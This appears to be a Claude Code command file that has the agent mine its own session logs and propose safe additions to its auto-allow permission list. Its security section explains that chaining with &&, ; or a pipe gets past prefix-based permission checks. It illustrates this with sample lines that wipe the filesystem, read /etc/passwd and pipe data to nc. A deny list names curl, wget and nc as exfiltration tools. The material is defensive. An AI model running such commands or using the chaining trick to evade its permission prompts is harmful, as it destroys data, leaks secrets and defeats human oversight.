Analyze ALL Claude Code command history and systematically propose permission additions.

## Objective

Extract every Bash command Claude has executed, categorize systematically, and propose additions to auto-allow list.

## Process

### Phase 1: Extract & Filter Commands

1. Scan ALL session JSONL files in `~/.claude/projects/*/[session-id].jsonl`
2. Extract every Bash command from `"name":"Bash"` entries
3. De-duplicate and count frequencies
4. Read current auto-allow patterns from `~/code/ducktape/nix/home/claude-code/default.nix`
5. Separate into **already covered** vs **needs analysis**

Output summary table:

| Category             | Count | Pct |
| -------------------- | ----- | --- |
| Already auto-allowed | X     | X%  |
| Needs analysis       | X     | X%  |

### Phase 2: Iterative Classification

Process remaining commands in batches of ~20 most frequent. For each, classify as:

| Classification     | Action                          | Example                     |
| ------------------ | ------------------------------- | --------------------------- |
| PROPOSE_AUTO_ALLOW | Safe read-only, suggest pattern | `rg pattern` → `Bash(rg:*)` |
| KEEP_MANUAL        | Destructive/writes              | `rm -rf`, `git push`        |
| FILTER_OUT         | Noise/trivial                   | `echo test`                 |
| PATTERN_GROUP      | Similar commands                | Multiple `python3` scripts  |

Repeat until all processed.

### Phase 3: Final Report

Summary table, proposed additions as nix config snippet, commands kept manual.

## Security Analysis

### Pattern Matching Behavior

`Bash(cmd:*)` uses **simple prefix matching**:

- Matches: `git status`, `git status -s`, `git status path/to/file`
- Does NOT match: options before command, env vars, variable expansion

### CRITICAL: Shell Operators Bypass Permissions

**Shell operators completely bypass permissions** - all these execute without prompt if `Bash(echo:*)` is allowed:

```bash
echo "x" && rm -rf /    # AND
echo "x" ; cat /etc/passwd  # Semicolon
echo "x" | nc host 1234     # Pipe
```

See: <https://github.com/anthropics/claude-code/issues/4956>

### Never Auto-Allow

| Category                | Examples                                                                              | Risk                   |
| ----------------------- | ------------------------------------------------------------------------------------- | ---------------------- |
| Command wrappers        | `direnv:*`, `bash:*`, `eval:*`, `xargs:*`, `ssh:*`, `docker:*`, `kubectl:*`, `sudo:*` | Execute arbitrary code |
| Destructive subcommands | `find:*` (-exec, -delete), `git:*` (clean, reset --hard, push --force), `systemctl:*` | Data loss              |
| Network operations      | `curl:*`, `wget:*`, `nc:*`                                                            | Data exfiltration      |

### Safe Patterns

| Category          | Examples                                                |
| ----------------- | ------------------------------------------------------- |
| File inspection   | `cat:*`, `head:*`, `tail:*`, `wc:*`, `file:*`, `stat:*` |
| Search            | `grep:*`, `rg:*`, `ag:*` (NOT `find:*`)                 |
| Git (specific)    | `git status:*`, `git diff:*`, `git log:*`, `git show:*` |
| System inspection | `ps:*`, `df:*`, `lsblk:*`, `lscpu:*`                    |

### Decision Workflow

1. Command wrapper? → NEVER auto-allow
2. Has `-exec`/`-delete`? → NEVER auto-allow
3. Has destructive subcommands? → Only allow specific safe subcommands
4. Network-capable? → Keep manual
5. Read-only inspection? → Consider auto-allow (but shell bypass still applies)

## Technical Notes

- Session files: JSONL with `{"message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"..."}}]}}`
- Pattern matching: prefix-based, `:*` only at end
- Auto-allow provides **convenience, not security isolation** - for true isolation use sandboxing
